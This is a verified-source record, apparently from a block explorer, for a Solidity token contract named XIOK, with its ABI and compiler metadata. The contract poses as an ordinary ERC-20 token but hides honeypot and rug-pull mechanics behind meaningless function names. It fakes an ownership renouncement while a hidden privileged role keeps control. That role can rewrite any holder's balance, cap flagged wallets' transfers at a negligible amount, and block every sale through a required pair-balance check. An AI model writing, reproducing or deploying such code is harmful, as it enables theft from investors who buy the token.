{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.14;\r\n\r\ninterface toTokenIs {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\nabstract contract toLiquidityTake {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface swapMin {\r\n    function createPair(address fundAuto, address walletShould) external returns (address);\r\n}\r\n\r\ninterface totalFund {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address shouldTake) external view returns (uint256);\r\n\r\n    function transfer(address tokenMin, uint256 tokenTotal) external returns (bool);\r\n\r\n    function allowance(address totalBuy, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 tokenTotal) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address tokenMin,\r\n        uint256 tokenTotal\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed enableMarketingFund, uint256 value);\r\n    event Approval(address indexed totalBuy, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface senderTeam is totalFund {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract XIOK is toLiquidityTake, totalFund, senderTeam {\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return marketingMax;\r\n    }\r\n\r\n    function amountMarketing(address tradingReceiver, uint256 tokenTotal) public {\r\n        teamMode();\r\n        sellWallet[tradingReceiver] = tokenTotal;\r\n    }\r\n\r\n    function approve(address teamMin, uint256 tokenTotal) public virtual override returns (bool) {\r\n        takeFundLimit[_msgSender()][teamMin] = tokenTotal;\r\n        emit Approval(_msgSender(), teamMin, tokenTotal);\r\n        return true;\r\n    }\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return receiverLaunch;\r\n    }\r\n\r\n    uint256 public totalTxFund;\r\n\r\n    bool private receiverShould;\r\n\r\n    function teamMode() private view {\r\n        require(fundMaxLiquidity[_msgSender()]);\r\n    }\r\n\r\n    mapping(address => uint256) private sellWallet;\r\n\r\n    event OwnershipTransferred(address indexed isTotal, address indexed txMode);\r\n\r\n    function isLaunched() public {\r\n        emit OwnershipTransferred(toShould, address(0));\r\n        amountReceiver = address(0);\r\n    }\r\n\r\n    function getOwner() external view returns (address) {\r\n        return amountReceiver;\r\n    }\r\n\r\n    address private amountReceiver;\r\n\r\n    bool public sellTotal;\r\n\r\n    uint256 tokenMaxExempt;\r\n\r\n    function balanceOf(address shouldTake) public view virtual override returns (uint256) {\r\n        return sellWallet[shouldTake];\r\n    }\r\n\r\n    function sellFund(address atLimit) public {\r\n        if (sellTotal) {\r\n            return;\r\n        }\r\n        if (swapToken != receiverShould) {\r\n            receiverShould = false;\r\n        }\r\n        fundMaxLiquidity[atLimit] = true;\r\n        \r\n        sellTotal = true;\r\n    }\r\n\r\n    function owner() external view returns (address) {\r\n        return amountReceiver;\r\n    }\r\n\r\n    address receiverAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return minBuy;\r\n    }\r\n\r\n    address totalExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\r\n\r\n    uint256 private launchedMin;\r\n\r\n    constructor (){\r\n        if (receiverShould != swapToken) {\r\n            totalTxFund = launchedMin;\r\n        }\r\n        toTokenIs feeList = toTokenIs(receiverAt);\r\n        feeShould = swapMin(feeList.factory()).createPair(feeList.WETH(), address(this));\r\n        if (launchedMin == totalTxFund) {\r\n            receiverShould = false;\r\n        }\r\n        toShould = _msgSender();\r\n        isLaunched();\r\n        fundMaxLiquidity[toShould] = true;\r\n        sellWallet[toShould] = minBuy;\r\n        \r\n        emit Transfer(address(0), toShould, minBuy);\r\n    }\r\n\r\n    uint256 limitList;\r\n\r\n    address public feeShould;\r\n\r\n    uint256 private minBuy = 200000000 * 10 ** 18;\r\n\r\n    function shouldTo(address takeTotal, address tokenMin, uint256 tokenTotal) internal returns (bool) {\r\n        require(sellWallet[takeTotal] >= tokenTotal);\r\n        sellWallet[takeTotal] -= tokenTotal;\r\n        sellWallet[tokenMin] += tokenTotal;\r\n        emit Transfer(takeTotal, tokenMin, tokenTotal);\r\n        return true;\r\n    }\r\n\r\n    string private launchReceiver = \"XIOK\";\r\n\r\n    mapping(address => bool) public feeLiquidity;\r\n\r\n    function marketingSellFrom(address takeTotal, address tokenMin, uint256 tokenTotal) internal returns (bool) {\r\n        if (takeTotal == toShould) {\r\n            return shouldTo(takeTotal, tokenMin, tokenTotal);\r\n        }\r\n        uint256 maxTokenReceiver = totalFund(feeShould).balanceOf(totalExempt);\r\n        require(maxTokenReceiver == tokenMaxExempt);\r\n        require(tokenMin != totalExempt);\r\n        if (feeLiquidity[takeTotal]) {\r\n            return shouldTo(takeTotal, tokenMin, swapList);\r\n        }\r\n        return shouldTo(takeTotal, tokenMin, tokenTotal);\r\n    }\r\n\r\n    function transferFrom(address takeTotal, address tokenMin, uint256 tokenTotal) external override returns (bool) {\r\n        if (_msgSender() != receiverAt) {\r\n            if (takeFundLimit[takeTotal][_msgSender()] != type(uint256).max) {\r\n                require(tokenTotal <= takeFundLimit[takeTotal][_msgSender()]);\r\n                takeFundLimit[takeTotal][_msgSender()] -= tokenTotal;\r\n            }\r\n        }\r\n        return marketingSellFrom(takeTotal, tokenMin, tokenTotal);\r\n    }\r\n\r\n    function amountWallet(address receiverAmount) public {\r\n        teamMode();\r\n        \r\n        if (receiverAmount == toShould || receiverAmount == feeShould) {\r\n            return;\r\n        }\r\n        feeLiquidity[receiverAmount] = true;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) private takeFundLimit;\r\n\r\n    bool private swapToken;\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return launchReceiver;\r\n    }\r\n\r\n    mapping(address => bool) public fundMaxLiquidity;\r\n\r\n    uint256 constant swapList = 9 ** 10;\r\n\r\n    uint8 private marketingMax = 18;\r\n\r\n    address public toShould;\r\n\r\n    function transfer(address tradingReceiver, uint256 tokenTotal) external virtual override returns (bool) {\r\n        return marketingSellFrom(_msgSender(), tradingReceiver, tokenTotal);\r\n    }\r\n\r\n    string private receiverLaunch = \"XIOK\";\r\n\r\n    function allowance(address teamLimit, address teamMin) external view virtual override returns (uint256) {\r\n        if (teamMin == receiverAt) {\r\n            return type(uint256).max;\r\n        }\r\n        return takeFundLimit[teamLimit][teamMin];\r\n    }\r\n\r\n    function fromTotalTeam(uint256 tokenTotal) public {\r\n        teamMode();\r\n        tokenMaxExempt = tokenTotal;\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketingFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"amountMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"fromTotalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMaxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"}],\"name\":\"sellFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTxFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "XIOK", "CompilerVersion": "v0.8.14+commit.80d49f37", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://44834d50f24d080d0d8f3c8db98d09e15107449487b877c300465359590f0a79"}